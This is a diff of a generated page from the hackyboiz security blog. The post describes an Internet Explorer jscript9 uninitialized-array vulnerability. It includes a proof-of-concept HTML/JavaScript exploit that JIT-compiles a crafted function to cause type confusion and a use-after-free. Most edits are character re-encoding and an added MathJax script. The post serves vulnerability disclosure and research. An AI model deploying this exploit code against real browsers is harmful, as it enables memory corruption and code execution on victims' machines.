@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      655 자
+      797 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      15
        분
     </span>
   
@@ -244,41 +244,41 @@
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
 <li>Internet Explorer (Windows 10)</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MS에서 지원을 2022년 6월에 완전히 종료하겠다고 밝힌 Internet Explorer에서 초기화되지 않은 배열 요소의 사용으로 인한 취약점이 발견되어 세부 정보가 공개되었습니다.</p>
-<p>취약점은 jscript9의 PropertyID 배열의 처리 방식에 존재합니다. PropertyID 배열은 <code>ByteCodeGenerator::EmitScopeObjectInit</code> 함수에 할당됩니다. 이때 할당 시 메모리를 초기화하지 않는 <code>ArenaAllocator::Alloc</code> 함수를 사용해 배열을 할당하므로 배열의 일부가 초기화되지 않은 상태로 유지됩니다.</p>
-<p>이러한 초기화되지 않은 PropertyID로 변수의 scope를 속일 수 있습니다. 이를 악용하면 정상적인 방법으로 액세스 할 수 없는 변수에 액세스 할 수 있으며 원격 코드 실행으로 이어질 수 있습니다. 해당 취약점은 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-1380.html">CVE-2020-1380</a>과 동일한 방법으로 JIT 엔진을 사용해 트리거할 수 있습니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MS&#xC5D0;&#xC11C; &#xC9C0;&#xC6D0;&#xC744; 2022&#xB144; 6&#xC6D4;&#xC5D0; &#xC644;&#xC804;&#xD788; &#xC885;&#xB8CC;&#xD558;&#xACA0;&#xB2E4;&#xACE0; &#xBC1D;&#xD78C; Internet Explorer&#xC5D0;&#xC11C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBC30;&#xC5F4; &#xC694;&#xC18C;&#xC758; &#xC0AC;&#xC6A9;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xCDE8;&#xC57D;&#xC810;&#xC740; jscript9&#xC758; PropertyID &#xBC30;&#xC5F4;&#xC758; &#xCC98;&#xB9AC; &#xBC29;&#xC2DD;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. PropertyID &#xBC30;&#xC5F4;&#xC740; <code>ByteCodeGenerator::EmitScopeObjectInit</code> &#xD568;&#xC218;&#xC5D0; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xD560;&#xB2F9; &#xC2DC; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xC9C0; &#xC54A;&#xB294; <code>ArenaAllocator::Alloc</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xBC30;&#xC5F4;&#xC744; &#xD560;&#xB2F9;&#xD558;&#xBBC0;&#xB85C; &#xBC30;&#xC5F4;&#xC758; &#xC77C;&#xBD80;&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xB85C; &#xC720;&#xC9C0;&#xB429;&#xB2C8;&#xB2E4;.</p>
+<p>&#xC774;&#xB7EC;&#xD55C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; PropertyID&#xB85C; &#xBCC0;&#xC218;&#xC758; scope&#xB97C; &#xC18D;&#xC77C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC561;&#xC138;&#xC2A4; &#xD560; &#xC218; &#xC5C6;&#xB294; &#xBCC0;&#xC218;&#xC5D0; &#xC561;&#xC138;&#xC2A4; &#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-1380.html">CVE-2020-1380</a>&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xBC29;&#xBC95;&#xC73C;&#xB85C; JIT &#xC5D4;&#xC9C4;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><strong>PoC Code</strong></p>
 <pre><code class="hljs html"><span class="hljs-comment">&lt;!-- saved from url=(0014)about:internet --&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
 
-<span class="javascript">alert(<span class="hljs-string">&#x27;start&#x27;</span>);</span>
+<span class="javascript">alert(<span class="hljs-string">&apos;start&apos;</span>);</span>
 
 <span class="javascript"><span class="hljs-comment">// prepare objects</span></span>
 <span class="javascript"><span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x8c</span>);</span>
 <span class="javascript"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Int32Array</span>(buf);</span>
 
-<span class="javascript"><span class="hljs-keyword">var</span> o = &#123;&#125;;</span>
-<span class="javascript">o.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span>
-<span class="javascript">    alert(<span class="hljs-string">&#x27;callback&#x27;</span>);</span>
+<span class="javascript"><span class="hljs-keyword">var</span> o = {};</span>
+<span class="javascript">o.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span>
+<span class="javascript">    alert(<span class="hljs-string">&apos;callback&apos;</span>);</span>
 <span class="javascript">    <span class="hljs-comment">// free </span></span>
-<span class="javascript">    worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&#x27;worker.js&#x27;</span>);</span>
+<span class="javascript">    worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&apos;worker.js&apos;</span>);</span>
     worker.postMessage(buf, [buf]);
     worker.terminate();
 <span class="javascript">    worker = <span class="hljs-literal">null</span>;</span>
 
 <span class="javascript">    <span class="hljs-comment">// sleep</span></span>
 <span class="javascript">    <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();</span>
-<span class="javascript">    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) &#123;&#125;</span>
+<span class="javascript">    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) {}</span>
 <span class="javascript">    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> reclaim freed memory</span></span>
 
 <span class="javascript">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span>
-&#125;;
+};
 
 <span class="javascript"><span class="hljs-comment">// generate function from string in order to have a clean bytecode generator</span></span>
 <span class="javascript"><span class="hljs-keyword">var</span> vulnstr =</span>
-<span class="javascript"><span class="hljs-string">&quot;for (let i=0; i&lt;1; i++) &#123;\n&quot;</span> +</span>
-<span class="javascript"><span class="hljs-string">&quot;    function opt(A, x, crash) &#123;\n&quot;</span> +</span>
-<span class="javascript"><span class="hljs-string">&quot;        &#x27;use strict&#x27;;\n&quot;</span> +</span>
+<span class="javascript"><span class="hljs-string">&quot;for (let i=0; i&lt;1; i++) {\n&quot;</span> +</span>
+<span class="javascript"><span class="hljs-string">&quot;    function opt(A, x, crash) {\n&quot;</span> +</span>
+<span class="javascript"><span class="hljs-string">&quot;        &apos;use strict&apos;;\n&quot;</span> +</span>
 <span class="javascript"><span class="hljs-string">&quot;        const aagaaaaaaahabauaaaaa = x+1;\n&quot;</span> + <span class="hljs-comment">//special variable name so that hash is eqal to 0x109 (property ID of Int16Array)</span></span>
 <span class="javascript"><span class="hljs-string">&quot;        const c02 = aagaaaaaaahabauaaaaa+1;\n&quot;</span> +</span>
 <span class="javascript"><span class="hljs-string">&quot;        const c03 = c02+1;\n&quot;</span> +</span>
@@ -317,19 +317,19 @@
 <span class="javascript"><span class="hljs-string">&quot;        const c36 = c35+1;\n&quot;</span> +</span>
 <span class="javascript"><span class="hljs-string">&quot;        const c37 = c36+1;\n&quot;</span> +</span>
 <span class="javascript"><span class="hljs-string">&quot;        const c38 = c37+1;\n&quot;</span> +</span>
-<span class="javascript"><span class="hljs-string">&quot;        if(crash) &#123;\n&quot;</span> +</span>
+<span class="javascript"><span class="hljs-string">&quot;        if(crash) {\n&quot;</span> +</span>
 <span class="javascript"><span class="hljs-string">&quot;          c06 = c06 + 1;\n&quot;</span> + <span class="hljs-comment">// we must change it here so that the value below is not known</span></span>
 <span class="javascript"><span class="hljs-string">&quot;          Int16Array = o;\n&quot;</span> + <span class="hljs-comment">// here we actually change the value (and type) of c06</span></span>
-<span class="javascript"><span class="hljs-string">&quot;        &#125;\n&quot;</span> +</span>
-<span class="javascript"><span class="hljs-string">&quot;        A[0] = c06;\n&quot;</span> + <span class="hljs-comment">// if crash==1, c06 is an object here, but JIT thinks it&#x27;s an integer</span></span>
+<span class="javascript"><span class="hljs-string">&quot;        }\n&quot;</span> +</span>
+<span class="javascript"><span class="hljs-string">&quot;        A[0] = c06;\n&quot;</span> + <span class="hljs-comment">// if crash==1, c06 is an object here, but JIT thinks it&apos;s an integer</span></span>
 <span class="javascript"><span class="hljs-string">&quot;        eval(1);\n&quot;</span> +  <span class="hljs-comment">// needed to trigger ByteCodeGenerator::EmitScopeObjectInit</span></span>
-<span class="javascript"><span class="hljs-string">&quot;    &#125;\n&quot;</span> +</span>
-<span class="javascript"><span class="hljs-string">&quot;    for(var i=0; i&lt;100000; i++) &#123;\n&quot;</span> + <span class="hljs-comment">// jit a function</span></span>
+<span class="javascript"><span class="hljs-string">&quot;    }\n&quot;</span> +</span>
+<span class="javascript"><span class="hljs-string">&quot;    for(var i=0; i&lt;100000; i++) {\n&quot;</span> + <span class="hljs-comment">// jit a function</span></span>
 <span class="javascript"><span class="hljs-string">&quot;      opt(arr, 1, 0);\n&quot;</span> +</span>
-<span class="javascript"><span class="hljs-string">&quot;    &#125;\n&quot;</span> +</span>
+<span class="javascript"><span class="hljs-string">&quot;    }\n&quot;</span> +</span>
 <span class="javascript"><span class="hljs-string">&quot;    opt(arr, 1, 1);\n&quot;</span> +</span>
-<span class="javascript"><span class="hljs-string">&quot;    alert(&#x27;failed&#x27;);\n&quot;</span> +</span>
-<span class="javascript"><span class="hljs-string">&quot;&#125;&quot;</span>;</span>
+<span class="javascript"><span class="hljs-string">&quot;    alert(&apos;failed&apos;);\n&quot;</span> +</span>
+<span class="javascript"><span class="hljs-string">&quot;}&quot;</span>;</span>
 
 <span class="javascript">vuln = <span class="hljs-built_in">Function</span>(vulnstr);</span>
 vuln();
@@ -636,6 +636,45 @@ vuln();
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
